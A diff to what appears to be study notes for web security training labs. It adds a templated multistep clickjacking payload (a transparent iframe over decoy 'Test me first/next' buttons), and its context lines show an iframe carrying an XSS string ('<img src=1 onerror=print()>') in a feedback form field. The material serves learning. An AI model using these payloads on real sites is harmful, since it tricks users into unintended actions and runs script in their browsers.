@@ -167,3 +167,32 @@ src="https://ac6f1fa31ecac23380c4079b000d00fe.web-security-academy.net/my-accoun
 <iframe
 src="https://acb41f951f633851803d2471000c00bf.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 ```
+
+
+
+### Lab: Multistep clickjacking
+
+```
+<style>
+   iframe {
+       position:relative;
+       width:$width_value;
+       height: $height_value;
+       opacity: $opacity;
+       z-index: 2;
+   }
+   .firstClick, .secondClick {
+       position:absolute;
+       top:$top_value1;
+       left:$side_value1;
+       z-index: 1;
+   }
+   .secondClick {
+       top:$top_value2;
+       left:$side_value2;
+   }
+</style>
+<div class="firstClick">Test me first</div>
+<div class="secondClick">Test me next</div>
+<iframe src="$url"></iframe>
+```
